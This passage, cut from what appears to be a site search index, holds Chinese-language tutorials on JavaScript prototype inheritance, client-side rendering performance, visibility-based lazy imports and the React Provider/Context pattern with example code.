自身属性 和 prototype 属性分别添加到 ownProps 数组和 prototypeProps 数组里面：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  let ownProps = []; let prototypeProps = []; for (let property in duck) { if(duck.hasOwnProperty(property)) { ownProps.push(property); } else { prototypeProps.push(property); } } console.log(ownProps); // [ \u0026#39;name\u0026#39; ] console.log(prototypeProps); // [ \u0026#39;numLegs\u0026#39; ]   \r四、了解构造函数属性 上例创建的实例对象 duck 和 beagle 都有一个特殊的 constructor 属性：\n1 2 3 4 5 6  let duck = new Bird(); let beagle = new Dog(); console.log(duck.constructor === Bird); // true console.log(beagle.constructor === Dog); // true   需要注意到的是这个 constructor 属性是对创建这个实例的构造函数的一个引用。\nconstructor 属性的一个好处是可以通过检查这个属性来找出它是一个什么对象。\n下面是一个例子，来看看是怎么使用的：\n1 2 3 4 5 6 7 8  function joinBirdFraternity(candidate) { if (candidate.constructor === Bird) { return true; } else { return false; } }   注意： 由于 constructor 属性可以被重写，所以最好使用 instanceof 方法来检查对象的类型。\n\r五、将原型更改为新对象 单独给 prototype 添加属性：\n1 2  Bird.prototype.numLegs = 2;   需要添加多个属性的，这未免会显得拖沓。\n1 2 3 4 5 6 7 8  Bird.prototype.eat = function() { console.log(\u0026#34;nom nom nom\u0026#34;); } Bird.prototype.describe = function() { console.log(\u0026#34;My name is \u0026#34; + this.name); }   一种更有效的方法就是给对象的 prototype 设置为一个已经包含了属性的新对象。\n这样一来，所有属性都可以一次性添加进来：\n1 2 3 4 5 6 7 8 9 10  Bird.prototype = { numLegs: 2, eat: function() { console.log(\u0026#34;nom nom nom\u0026#34;); }, describe: function() { console.log(\u0026#34;My name is \u0026#34; + this.name); } };   \r六、更改原型时，记得设置构造函数属性 手动设置一个新对象的原型有一个重要的副作用。\n它清除了 constructor 属性！\n此属性可以用来检查是哪个构造函数创建了实例，但由于该属性已被覆盖，它现在给出了错误的结果：\n1 2 3 4  duck.constructor === Bird; // false duck.constructor === Object; // true duck instanceof Bird; // true   为了解决这个问题，凡是手动给新对象重新设置过原型对象的，都别忘记在原型对象中定义一个 constructor 属性：\n1 2 3 4 5 6 7 8 9 10 11  Bird.prototype = { constructor: Bird, numLegs: 2, eat: function() { console.log(\u0026#34;nom nom nom\u0026#34;); }, describe: function() { console.log(\u0026#34;My name is \u0026#34; + this.name); } };   \r七、了解对象的原型来自哪里 就像人们从父母那里继承基因一样，对象也可直接从创建它的构造函数那里继承其 prototype。\n请看下面的例子：Bird 构造函数创建了一个 duck 对象：\n1 2 3 4 5 6  function Bird(name) { this.name = name; } let duck = new Bird(\u0026#34;Donald\u0026#34;);   duck 从 Bird 构造函数那里继承了它的 prototype。\n你可以使用 isPrototypeOf 方法来验证他们之间的关系：\n1 2  Bird.prototype.isPrototypeOf(duck); // true   八、了解原型链 JavaScript 中所有的对象（除了少数例外）都有自己的 prototype。\n而且，对象的 prototype 本身也是一个对象。\n1 2 3 4 5 6  function Bird(name) { this.name = name; } typeof Bird.prototype; // object   正因为 prototype 是一个对象，所以 prototype 对象也有它自己的 prototype！\n这样看来的话，Bird.prototype 的 prototype 就是 Object.prototype：\n1 2  Object.prototype.isPrototypeOf(Bird.prototype); // true   这有什么作用呢？\n1 2 3  let duck = new Bird(\u0026#34;Donald\u0026#34;); duck.hasOwnProperty(\u0026#34;name\u0026#34;);   hasOwnProperty 是定义在 Object.prototype 上的一个方法，\n尽管在 Bird.prototype 和 duck上并没有定义该方法，但是我们依然可以在这两个对象上访问到。\n这就是 prototype 链的一个例子。\n在这个 prototype 链中，Bird 是 duck 的 supertype，而 duck 是 subtype。\nObject 则是 Bird 和 duck 实例共同的 supertype。\nObject 是 JavaScript 中所有对象的 supertype，也就是原型链的最顶层。\n因此，所有对象都可以访问 hasOwnProperty 方法。\n\r十、使用继承避免重复 有一条原则叫做：Don\u0026rsquo;t Repeat Yourself。\n常以缩写形式 DRY 出现，意思是“不要自己重复”。\n编写重复代码会产生的问题是：任何改变都需要去多个地方修复所有重复的代码。\n这通常意味着我们需要做更多的工作，会产生更高的出错率。\n请观察下面的示例，Bird 和 Dog 共享 describe 方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  Bird.prototype = { constructor: Bird, describe: function() { console.log(\u0026#34;My name is \u0026#34; + this.name); } }; Dog.prototype = { constructor: Dog, describe: function() { console.log(\u0026#34;My name is \u0026#34; + this.name); } };   我们可以看到 describe 方法在两个地方重复定义了。\n根据以上所说的 DRY 原则，我们可以通过创建一个 Animal supertype（或者父类）来重写这段代码：\n1 2 3 4 5 6 7 8 9 10  function Animal(name) { }; Animal.prototype = { constructor: Animal, name: name, describe: function() { console.log(\u0026#34;My name is \u0026#34; + this.name); } };   Animal 构造函数中定义了 describe 方法，可将 Bird 和 Dog 这两个构造函数的方法删除掉：\n1 2 3 4 5 6 7 8 9 10 11  let Bird = new Animal() let Dog = new Animal() Bird.prototype = { constructor: Bird }; Dog.prototype = { constructor: Dog };   \r十一、从超类继承行为 创建一个超类 supertype（或者叫父类）的实例\n1 2 3 4 5  function Animal() { } Animal.prototype.eat = function() { console.log(\u0026#34;nom nom nom\u0026#34;); };   1 2  let animal = new Animal();   此语法用于继承时会存在一些缺点，太复杂了animal.prototype = {constructor: animal}。\n相反，另外一种没有这些缺点的方法来替代 new 操作：\n1 2  let animal = Object.create(Animal.prototype);   Object.create(obj) 创建了一个新对象，并指定了 obj 作为新对象的 prototype。\n回忆一下，之前说过 prototype 就像是创建对象的“配方”。\n如果把 animal 的 prototype 设置为与 Animal 构造函数的 prototype 一样，\n那么就相当于让 animal 这个实例具有与 Animal 的其他实例相同的“配方”了。\n1 2 3  animal.eat(); // nom nom nom animal instanceof Animal; // true   \r十二、将子辈的原型设置为父辈的实例 给子类型（或者子类）设置 prototype。 这样一来，Bird 就是 Animal 的一个实例了\n1 2  Bird.prototype = Object.create(Animal.prototype);   请记住，prototype 类似于创建对象的“配方”。 从某种意义上来说，Bird 对象的配方包含了 Animal 的所有关键“成分”。\n1 2 3  let duck = new Bird(\u0026#34;Donald\u0026#34;); duck.eat();   duck 继承了Animal 的所有属性，其中包括了 eat 方法。\n\r十三、重置一个继承的构造函数属性 当一个对象从另一个对象那里继承了其 prototype 时，那它也继承了父类的 constructor 属性。\n1 2 3 4 5  function Bird() { } Bird.prototype = Object.create(Animal.prototype); let duck = new Bird(); duck.constructor   但是 duck 和其他所有 Bird 的实例都应该表明它们是由 Bird 创建的，而不是由 Animal 创建的。\n为此，可以手动将 Bird 的构造函数属性设置为 Bird 对象：\n1 2 3 4  Bird.prototype.constructor = Bird; let duck = new Bird(); duck.constructor // [Function: Bird]   \r十四、继承后添加方法 从超类构造函数继承其 prototype 对象的构造函数，除了继承的方法外，还可以拥有自己的方法。\nBird 是一个构造函数，它继承了 Animal 的 prototype：\n1 2 3 4 5 6 7 8  function Animal() { } Animal.prototype.eat = function() { console.log(\u0026#34;nom nom nom\u0026#34;); }; function Bird() { } Bird.prototype = Object.create(Animal.prototype); // {} Bird.prototype.constructor = Bird; // [Function: Bird]   除了从 Animal 构造函数继承的行为之外，还需要给 Bird 对象添加它独有的行为。\n这里，我们给 Bird 对象添加一个 fly() 函数。\n函数会以一种与其他构造函数相同的方式添加到 Bird\u0026rsquo;s 的 prototype 中：\n1 2 3 4  Bird.prototype.fly = function() { console.log(\u0026#34;I\u0026#39;m flying!\u0026#34;); };   现在 Bird 的实例中就有了 eat() 和 fly() 这两个方法：\n1 2 3 4  let duck = new Bird(); duck.eat(); // nom nom nom duck.fly(); // I\u0026#39;m flying!   \r十五、重写继承方法 通过使用一个与需要重写的方法相同的方法名，向 ChildObject.prototype 中添加方法。\n请看下面的举例：Bird 重写了从 Animal 继承来的 eat() 方法：\n1 2 3 4 5 6 7 8 9 10 11 12  function Animal() { } Animal.prototype.eat = function() { return \u0026#34;nom nom nom\u0026#34;; }; function Bird() { } Bird.prototype = Object.create(Animal.prototype); Bird.prototype.eat = function() { return \u0026#34;peck peck peck\u0026#34;; };   如果你有一个实例：let duck = new Bird();，然后你调用了 duck.eat()，以下就是 JavaScript 在 duck 的 prototype 链上寻找方法的过程：\n duck =\u0026gt; eat() 是定义在这里吗？ 不是。 Bird =\u0026gt; eat() 是定义在这里吗？ =\u0026gt; 是的。 执行它并停止往上搜索。 Animal =\u0026gt; 这里也定义了 eat() 方法，但是 JavaScript 在到达这层原型链之前已停止了搜索。 Object =\u0026gt; JavaScript 在到达这层原型链之前也已经停止了搜索。  \r十六、使用 Mixin 在不相关对象之间添加共同行为 行为是可以通过继承来共享的。\n然而，在有些情况下，继承不是最好的解决方案。\n继承不适用于不相关的对象，比如 Bird 和 Airplane。 虽然它们都可以飞行，但是 Bird 并不是一种 Airplane，反之亦然。\n对于不相关的对象，更好的方法是使用 mixins。\nmixin 允许其他对象使用函数集合。\n1 2 3 4 5 6  let flyMixin = function(obj) { obj.fly = function() { console.log(\u0026#34;Flying, wooosh!\u0026#34;); } };   flyMixin 能接受任何对象，并为其提供 fly 方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13  let bird = { name: \u0026#34;Donald\u0026#34;, numLegs: 2 }; let plane = { model: \u0026#34;777\u0026#34;, numPassengers: 524 }; flyMixin(bird); flyMixin(plane);   这里的 flyMixin 接收了bird 和 plane 对象，然后将 fly 方法分配给了每一个对象。 现在 bird 和 plane 都可以飞行了：\n1 2 3  bird.fly(); // Flying, wooosh! plane.fly(); // Flying, wooosh!   \r十七、使用闭包保护对象内的属性不被外部修改 bird 有一个公共属性 name。 公共属性的定义就是：它可以在 bird 的定义范围之外被访问和更改。\n1 2  bird.name = \u0026#34;Duffy\u0026#34;;   因此，代码的任何地方都可以轻松地将 bird 的 name 属性更改为任意值。\n想想密码和银行账户之类的东西，如果代码库的任何部分都可以轻易改变他们。 那么将会引起很多问题。\n使属性私有化最简单的方法就是在构造函数中创建变量。\n可以将该变量范围限定在构造函数中，而不是全局可用。\n这样，属性只能由构造函数中的方法访问和更改。\n1 2 3 4 5 6 7 8 9 10 11  function Bird() { let hatchedEgg = 10; this.getHatchedEggCount = function() { return hatchedEgg; }; } let ducky = new Bird(); ducky.getHatchedEggCount(); console.log(ducky.hatcheEgg) // undefined   这里的 getHatchedEggCount 是一种特权方法，因为它可以访问私有属性 hatchedEgg。\n这是因为 hatchedEgg 是在与 getHatchedEggCount 相同的上下文中声明的。\n在 JavaScript 中，函数总是可以访问创建它的上下文。 这就叫做 闭包 closure。\n\r知识点   hasOwnProperty 获取自身属性的方法\n  prototype 原型属性\n  isPrototypeOf 验证原型的关系的方法\n  如果不用传参： Object.create(object) 优于 new 关键字\n  constructor\n  closure 闭包\n  ","description":"性能优化","id":78,"section":"javascript","tags":null,"title":"原型","uri":"https://codthing.github.io/javascript/algorithms-data/object-programming/prototype/"},{"content":"在客户端呈现 (CSR) 中，服务器仅呈现页面的准系统 HTML 容器。 在页面上显示内容所需的逻辑、数据获取、模板和路由由在浏览器/客户端中执行的 JavaScript 代码处理。 CSR 作为一种构建单页应用程序的方法变得流行起来。 它有助于模糊网站和已安装应用程序之间的区别。\n为了更好地了解其他模式提供的好处，让我们首先深入了解客户端渲染 (CSR)，并找出它在哪些情况下工作得很好以及它的缺点是什么。\n\rCSR - 基本结构 考虑这个使用 React 在页面上显示和更新当前时间的简单示例。\nHTML:\n\u0026lt;div id=\u0026#34;root\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; JS:\nfunction tick() {\rconst element = (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;Hello, world!\u0026lt;/h1\u0026gt;\r\u0026lt;h2\u0026gt;It is {new Date().toLocaleTimeString()}.\u0026lt;/h2\u0026gt;\r\u0026lt;/div\u0026gt;\r);\rReactDOM.render(element,document.getElementById(\u0026#39;root\u0026#39;));\r}\rsetInterval(tick, 1000); HTML 只包含一个根 div 标签。\n另一方面，内容显示和更新完全在 JavaScript 中处理。 没有到服务器的往返行程，渲染的 HTML 就地更新。\n在这里，时间可以被任何其他实时信息替换，例如从 API 获取的汇率或股票价格，并在不刷新页面或往返服务器的情况下显示。\n\rJavaScript 包(bundles)和性能 随着页面显示图像、显示数据存储中的数据和包括事件处理的复杂性增加，呈现页面所需的 JavaScript 代码的复杂性和大小也将增加。\nCSR 产生了大量的 JavaScript 包，从而增加了页面的 FCP 和 TTI。\n如上图所示，随着 bundle.js 的大小增加，FCP 和 TTI 被向前推。\n这意味着用户将在 FP 和 FCP 之间的整个持续时间内看到一个空白屏幕。\n\r优缺点 使用 React，大部分应用程序逻辑在客户端执行，它通过 API 调用与服务器交互以获取或保存数据。\n因此几乎所有的 UI 都是在客户端上生成的。 整个 Web 应用程序在第一个请求时加载。 当用户通过单击链接进行导航时，不会向服务器生成用于呈现页面的新请求。 该代码在客户端上运行以更改视图/数据。\nCSR 允许我们拥有一个单页应用程序，该应用程序支持无需页面刷新的导航并提供出色的用户体验。\n由于为更改视图而处理的数据有限，因此页面之间的路由通常会更快，从而使 CSR 应用程序看起来更具响应性。\nCSR 还允许开发人员实现客户端和服务器代码之间的明确分离。\n尽管它提供了出色的交互体验，但此 CSR 仍存在一些缺陷。\n  SEO 考虑因素：\n大多数网络爬虫可以以直接的方式解释服务器呈现的网站。\n在客户端渲染的情况下，事情会变得稍微复杂一些，因为大负载和大量网络请求（例如 API 响应）可能会导致有意义的内容渲染速度不够快，爬虫无法对其进行索引。\n爬虫可能会理解 JavaScript，但存在局限性。因此，需要一些变通方法来使客户端呈现的网站 SEO 友好。\n  性能：\n通过客户端渲染，交互过程中的响应时间大大提高，因为没有到服务器的往返。\n但是，对于浏览器第一次在客户端呈现内容，它们必须等待 JavaScript 首先加载并开始处理。\n因此，用户在初始页面加载之前会遇到一些延迟。\n随着 JS 包的大小变大和/或客户端没有足够的处理能力，这可能会影响用户体验。\n  代码可维护性：\n代码的某些元素可能会在不同语言的客户端和服务器 (API) 中重复。\n在其他情况下，可能无法完全分离业务逻辑。这方面的示例可能包括货币和日期字段的验证和格式化逻辑。\n  数据获取：\n对于客户端呈现，数据获取通常是事件驱动的。\n该页面最初可以在没有任何数据的情况下加载。\n随后可以使用 API 调用在发生页面加载或按钮点击等事件时获取数据。\n根据数据的大小，这可能会增加应用程序的加载/交互时间。\n  这些注意事项的重要性可能因应用程序而异。 开发人员通常对寻找 SEO 友好的解决方案感兴趣，这些解决方案可以在不影响交互时间的情况下更快地提供页面。 根据应用要求，分配给不同性能标准的优先级可能不同。 有时，使用客户端渲染并进行一些调整而不是采用完全不同的模式可能就足够了。\n\r提升 CSR 性能 由于 CSR 的性能与 JavaScript 包的大小成反比，\n我们能做的最好的事情就是构建我们的 JavaScript 代码以获得最佳性能。\n以下是可以提供帮助的指针列表。\n  按需压缩加载：\n确保为初始页面加载有一个合理紧张的 JavaScript 预算。 一个小于 100-170KB 的压缩包和 gzip 压缩包是一个很好的起点。 然后可以在需要功能时按需加载代码\n  预加载：\n此技术可用于在页面生命周期的早期预加载页面所需的关键资源。 关键资源可能包括 JavaScript，可以通过在 HTML 的 \u0026lt;head\u0026gt; 部分中包含以下指令来预加载。\n  \u0026lt;link rel=\u0026#34;preload\u0026#34; as=\u0026#34;script\u0026#34; href=\u0026#34;critical.js\u0026#34;\u0026gt; 这会通知浏览器在页面渲染机制启动之前开始加载 critical.js 文件。 脚本将因此更早可用并且不会阻塞页面渲染机制从而提高性能。\n 延迟加载：\n通过延迟加载，可以识别非关键资源并仅在需要时加载这些资源。\n使用这种方法可以改进初始页面加载时间，因为最初加载的资源大小减少了。\n例如，聊天小部件组件通常不会在页面加载时立即需要，可以延迟加载。\n  代码拆分：\n为了避免大量的 JavaScript 代码，可以拆分代码包。\n代码拆分受 Webpack 等打包器的支持，可用于创建多个可在运行时动态加载的包。\n代码拆分还能够延迟加载 JavaScript 资源。\n  服务工作者的应用程序Shell缓存：\n这项技术涉及缓存应用程序外壳Shell，它是支持用户界面的最小 HTML、CSS 和 JavaScript。 Service Worker 可用于离线缓存应用程序外壳。\n这对于提供本机单页应用程序体验非常有用，其中剩余内容根据需要逐步加载。\n  通过这些技术，CSR 可以帮助提供更快的单页应用程序体验，并具有不错的 FCP 和 TTI。\n接下来，我们将看到在服务器端渲染的另一端可用的内容。\n\r知识点  bundles FCP TTI FP FCP rel=\u0026ldquo;preload\u0026rdquo; as=\u0026ldquo;script\u0026rdquo;  ","description":"在客户端呈现应用程序的 UI","id":79,"section":"react-patterns","tags":null,"title":"客户端渲染","uri":"https://codthing.github.io/react-patterns/render-patterns/client-side-rendering/"},{"content":"除了用户交互，经常有在初始页面上不可见的组件。\n一个很好的例子是延迟加载在视口中不直接可见的图像，但只有在用户向下滚动时才会加载。\n由于不会立即请求所有图像，因此可以减少初始加载时间。\n可以对组件做同样的事情！\n为了知道组件当前是否在视口中，\n可以使用 IntersectionObserver API，\n或者 react-lazyload 、 react-loadable-visibility 来快速为应用程序添加可见性的导入。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  // components/ChatInput.js import React from \u0026#34;react\u0026#34;; import Send from \u0026#34;./icons/Send\u0026#34;; import Emoji from \u0026#34;./icons/Emoji\u0026#34;; import LoadableVisibility from \u0026#34;react-loadable-visibility/react-loadable\u0026#34;; const EmojiPicker = LoadableVisibility({ loader: () =\u0026gt; import(\u0026#34;./EmojiPicker\u0026#34;), loading: \u0026lt;p id=\u0026#34;loading\u0026#34;\u0026gt;Loading\u0026lt;/p\u0026gt; }); const ChatInput = () =\u0026gt; { const [pickerOpen, togglePicker] = React.useReducer(state =\u0026gt; !state, false); return ( \u0026lt;div className=\u0026#34;chat-input-container\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; placeholder=\u0026#34;Type a message...\u0026#34; /\u0026gt; \u0026lt;Emoji onClick={togglePicker} /\u0026gt; {pickerOpen \u0026amp;\u0026amp; \u0026lt;EmojiPicker /\u0026gt;} \u0026lt;Send /\u0026gt; \u0026lt;/div\u0026gt; ); }; console.log(\u0026#34;ChatInput loading\u0026#34;, Date.now()); export default ChatInput;   每当 EmojiPicker 被渲染到屏幕上时，在用户点击 Gif 按钮后，react-loadable-visibility 会检测到 EmojiPicker 元素应该在屏幕上可见。\n只有这样，当用户看到正在渲染的加载组件时，它才会开始导入模块。\n这个回退组件让用户知道应用程序没有冻结：他们只需要等待一小段时间来加载、解析、编译和执行模块！\n\r知识点   IntersectionObserver\n  react-lazyload\n  react-loadable-visibility\n  ","description":"当它们在视口中可见时加载非关键组件","id":80,"section":"react-patterns","tags":null,"title":"导入可见性","uri":"https://codthing.github.io/react-patterns/performance-patterns/import-on-visibility/"},{"content":"在某些情况下，我们希望为应用程序中的许多（如果不是全部）组件提供可用数据。\n\r单向数据流 props 存在的问题 虽然我们可以使用 props 将数据传递给组件，但如果应用程序中的几乎所有组件都需要访问 props 的值，这可能很难做到。\n我们经常会得到一些叫做 prop 钻孔的东西，当我们将 props 向下传递到组件树时就是这种情况。\n重构依赖于 props 的代码变得几乎不可能，而且知道某些数据来自哪里也很困难。\n假设我们有一个包含某些数据的 App 组件。 在组件树的最下方，我们有一个 ListItem、Header 和 Text 组件，它们都需要这些数据。 为了将这些数据传递给这些组件，我们必须通过多层组件传递它。\n在我们的代码库中，这将类似于以下内容：\nfunction App() {\rconst data = { ... }\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;SideBar data={data} /\u0026gt;\r\u0026lt;Content data={data} /\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\rconst SideBar = ({ data }) =\u0026gt; \u0026lt;List data={data} /\u0026gt;\rconst List = ({ data }) =\u0026gt; \u0026lt;ListItem data={data} /\u0026gt;\rconst ListItem = ({ data }) =\u0026gt; \u0026lt;span\u0026gt;{data.listItem}\u0026lt;/span\u0026gt;\rconst Content = ({ data }) =\u0026gt; (\r\u0026lt;div\u0026gt;\r\u0026lt;Header data={data} /\u0026gt;\r\u0026lt;Block data={data} /\u0026gt;\r\u0026lt;/div\u0026gt;\r)\rconst Header = ({ data }) =\u0026gt; \u0026lt;div\u0026gt;{data.title}\u0026lt;/div\u0026gt;\rconst Block = ({ data }) =\u0026gt; \u0026lt;Text data={data} /\u0026gt;\rconst Text = ({ data }) =\u0026gt; \u0026lt;h1\u0026gt;{data.text}\u0026lt;/h1\u0026gt; 以这种方式传递道具会变得非常混乱。如果我们想在未来重命名 data prop，我们必须在所有组件中重命名它。您的应用程序越大，道具钻孔就越棘手。\n我们最好可以跳过不需要使用这些数据的所有组件层。我们需要一些东西，让需要访问数据值的组件直接访问它，而不依赖于道具钻取。\n\rProvider 提供者 这就是提供者 Provider 模式可以帮助我们的地方！使用提供者模式，我们可以使数据可供多个组件使用。\n我们可以将所有组件包装在一个 Provider 中，而不是通过 props 将数据向下传递到每一层。\nProvider 是一个由 Context 对象提供给我们的高阶组件。\n我们可以使用 React 为我们提供的 createContext 方法创建一个 Context 对象。\nProvider 接收一个 value prop，其中包含我们想要传递的数据。包装在此 Provider 中的所有组件都可以访问 value 属性的值。\nconst DataContext = React.createContext()\rfunction App() {\rconst data = { ... }\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;DataContext.Provider value={data}\u0026gt;\r\u0026lt;SideBar /\u0026gt;\r\u0026lt;Content /\u0026gt;\r\u0026lt;/DataContext.Provider\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r} 我们不再需要手动将数据属性传递给每个组件！ 那么，ListItem、Header、Text 组件如何访问数据的值呢？\n每个组件都可以通过使用 useContext 钩子来访问数据。 这个钩子接收数据引用的上下文，在这种情况下是 DataContext 。 useContext 钩子让我们可以读取和写入数据到上下文对象。\nconst DataContext = React.createContext();\rfunction App() {\rconst data = { ... }\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;SideBar /\u0026gt;\r\u0026lt;Content /\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\rconst SideBar = () =\u0026gt; \u0026lt;List /\u0026gt;\rconst List = () =\u0026gt; \u0026lt;ListItem /\u0026gt;\rconst Content = () =\u0026gt; \u0026lt;div\u0026gt;\u0026lt;Header /\u0026gt;\u0026lt;Block /\u0026gt;\u0026lt;/div\u0026gt;\rfunction ListItem() {\rconst { data } = React.useContext(DataContext);\rreturn \u0026lt;span\u0026gt;{data.listItem}\u0026lt;/span\u0026gt;;\r}\rfunction Text() {\rconst { data } = React.useContext(DataContext);\rreturn \u0026lt;h1\u0026gt;{data.text}\u0026lt;/h1\u0026gt;;\r}\rfunction Header() {\rconst { data } = React.useContext(DataContext);\rreturn \u0026lt;div\u0026gt;{data.title}\u0026lt;/div\u0026gt;;\r} 不使用数据值的组件根本不必处理数据。 我们不再需要担心通过不需要 props 值的组件将 props 向下传递几个级别，这使得重构更容易。\n\r主题 Theme UI Provider 模式对于共享全局数据非常有用。 提供者模式的一个常见用例是与许多组件共享一个主题 UI 状态。\n假设我们有一个显示列表的简单应用程序。\n我们希望用户能够通过切换开关在亮模式和暗模式之间切换。 当用户从暗模式切换到亮模式（反之亦然）时，背景颜色和文本颜色应该改变！\n我们可以将组件包装在 ThemeProvider 中，并将当前主题颜色传递给提供程序，而不是将当前主题值向下传递给每个组件。\nexport const ThemeContext = React.createContext();\rconst themes = {\rlight: {\rbackground: \u0026#34;#fff\u0026#34;,\rcolor: \u0026#34;#000\u0026#34;\r},\rdark: {\rbackground: \u0026#34;#171717\u0026#34;,\rcolor: \u0026#34;#fff\u0026#34;\r}\r};\rexport default function App() {\rconst [theme, setTheme] = useState(\u0026#34;dark\u0026#34;);\rfunction toggleTheme() {\rsetTheme(theme === \u0026#34;light\u0026#34; ? \u0026#34;dark\u0026#34; : \u0026#34;light\u0026#34;);\r}\rconst providerValue = {\rtheme: themes[theme],\rtoggleTheme\r};\rreturn (\r\u0026lt;div className={`App theme-${theme}`}\u0026gt;\r\u0026lt;ThemeContext.Provider value={providerValue}\u0026gt;\r\u0026lt;Toggle /\u0026gt;\r\u0026lt;List /\u0026gt;\r\u0026lt;/ThemeContext.Provider\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} 由于 Toggle 和 List 组件都包含在 ThemeContext 提供程序中，我们可以访问作为值传递给提供者的值 theme 和 toggleTheme 。\n在 Toggle 组件中，我们可以使用 toggleTheme 函数相应地更新主题。\nimport React, { useContext } from \u0026#34;react\u0026#34;;\rimport { ThemeContext } from \u0026#34;./App\u0026#34;;\rexport default function Toggle() {\rconst theme = useContext(ThemeContext);\rreturn (\r\u0026lt;label className=\u0026#34;switch\u0026#34;\u0026gt;\r\u0026lt;input type=\u0026#34;checkbox\u0026#34; onClick={theme.toggleTheme} /\u0026gt;\r\u0026lt;span className=\u0026#34;slider round\u0026#34; /\u0026gt;\r\u0026lt;/label\u0026gt;\r);\r} List 组件本身并不关心主题的当前值。 但是，ListItem 组件需要！ 我们可以直接在 ListItem 中使用主题上下文。\nimport React, { useContext } from \u0026#34;react\u0026#34;;\rimport { ThemeContext } from \u0026#34;./App\u0026#34;;\rexport default function TextBox() {\rconst theme = useContext(ThemeContext);\rreturn \u0026lt;li style={theme.theme}\u0026gt;...\u0026lt;/li\u0026gt;;\r} Perfect! 我们不必将任何数据传递给不关心主题当前值的组件。\n\rHooks 我们可以创建一个钩子来为组件提供上下文。 不必在每个组件中导入 useContext 和 Context，我们可以使用一个钩子来返回我们需要的上下文。\nfunction useThemeContext() {\rconst theme = useContext(ThemeContext);\rreturn theme;\r} 为了确保它是一个有效的主题，让我们在 useContext(ThemeContext) 返回一个虚假值时抛出一个错误。\n1 2 3 4 5 6 7 8  function useThemeContext() { const theme = useContext(ThemeContext); if (!theme) { throw new Error(\u0026#34;useThemeContext 必须在 ThemeProvider 中使用\u0026#34;); } return theme; }   我们可以创建一个 HOC，使用提供的值添加返回此组件，而不是直接使用 ThemeContext.Provider 组件包装组件。 通过这种方式，我们可以将上下文逻辑与渲染组件分离，从而提高提供程序的可重用性。\nfunction ThemeProvider() {\rconst [theme, setTheme] = useState(\u0026#34;dark\u0026#34;);\rfunction toggleTheme() {\rsetTheme(theme === \u0026#34;light\u0026#34; ? \u0026#34;dark\u0026#34; : \u0026#34;light\u0026#34;);\r}\rconst providerValue = {\rtheme: themes[theme],\rtoggleTheme\r};\rreturn (\r\u0026lt;ThemeContext.Provider value={providerValue}\u0026gt;\r{children}\r\u0026lt;/ThemeContext.Provider\u0026gt;\r);\r}\rexport default function App() {\rreturn (\r\u0026lt;div className={`App theme-${theme}`}\u0026gt;\r\u0026lt;ThemeProvider\u0026gt;\r\u0026lt;Toggle /\u0026gt;\r\u0026lt;List /\u0026gt;\r\u0026lt;/ThemeProvider\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} 每个需要访问 ThemeContext 的组件现在可以简单地使用 useThemeContext 钩子。\nexport default function TextBox() {\rconst theme = useThemeContext();\rreturn \u0026lt;li style={theme.theme}\u0026gt;...\u0026lt;/li\u0026gt;;\r} 通过为不同的上下文创建钩子，很容易将提供者的逻辑与呈现数据的组件分开。\n\r案例分析 一些库提供了内置的提供者，我们可以在消费组件中使用这些值。 一个很好的例子就是样式组件。\n理解这个例子不需要任何样式组件的经验。\nstyled-components 库为我们提供了一个 ThemeProvider。 每个样式组件都可以访问此提供程序的值！ 我们可以使用提供给我们的 API，而不是自己创建上下文 API！\n让我们使用相同的 List 示例，并将组件包装在从样式组件库导入的 ThemeProvider 中。\nimport { ThemeProvider } from \u0026#34;styled-components\u0026#34;;\rexport default function App() {\rconst [theme, setTheme] = useState(\u0026#34;dark\u0026#34;);\rfunction toggleTheme() {\rsetTheme(theme === \u0026#34;light\u0026#34; ? \u0026#34;dark\u0026#34; : \u0026#34;light\u0026#34;);\r}\rreturn (\r\u0026lt;div className={`App theme-${theme}`}\u0026gt;\r\u0026lt;ThemeProvider theme={themes[theme]}\u0026gt;\r\u0026lt;\u0026gt;\r\u0026lt;Toggle toggleTheme={toggleTheme} /\u0026gt;\r\u0026lt;List /\u0026gt;\r\u0026lt;/\u0026gt;\r\u0026lt;/ThemeProvider\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} 我们不会将内联样式道具传递给 ListItem 组件，而是将其设为 styled.li 组件。 由于它是一个样式组件，我们可以访问 theme 的值！\nimport styled from \u0026#34;styled-components\u0026#34;;\rexport default function ListItem() {\rreturn (\r\u0026lt;Li\u0026gt;\rLorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod\rtempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim\rveniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea\rcommodo consequat.\r\u0026lt;/Li\u0026gt;\r);\r}\rconst Li = styled.li`\r${({ theme }) =\u0026gt; `\rbackground-color: ${theme.backgroundColor};\rcolor: ${theme.color};\r`}\r`; 太棒了，我们现在可以使用 ThemeProvider 轻松地将样式应用于我们所有的样式组件！\n\r优点 提供者模式/上下文 API 可以将数据传递给许多组件，而无需手动将其传递到每个组件层。\n它降低了重构代码时意外引入错误的风险。 以前，如果我们想要重命名一个 prop，我们必须在使用该值的整个应用程序中重命名该 prop。\n我们不再需要处理可被视为反模式的螺旋钻。 以前，可能很难理解应用程序的数据流，因为并不总是清楚某些 prop 值的来源。 使用 Provider 模式，我们不再需要不必要地将 props 传递给不关心这些数据的组件。\n使用 Provider 模式可以轻松保持某种全局状态，因为我们可以让组件访问此全局状态。\n\r缺点 在某些情况下，过度使用提供者模式会导致性能问题。 使用上下文的所有组件在每次状态更改时都会重新渲染。\n让我们看一个例子。 我们有一个简单的计数器，每次单击 Button 组件中的 Increment 按钮时，该计数器的值都会增加。 我们在重置组件中还有一个重置按钮，它将计数重置为 0。\n但是，当您单击 Increment 时，您会看到重新渲染的不仅仅是计数。 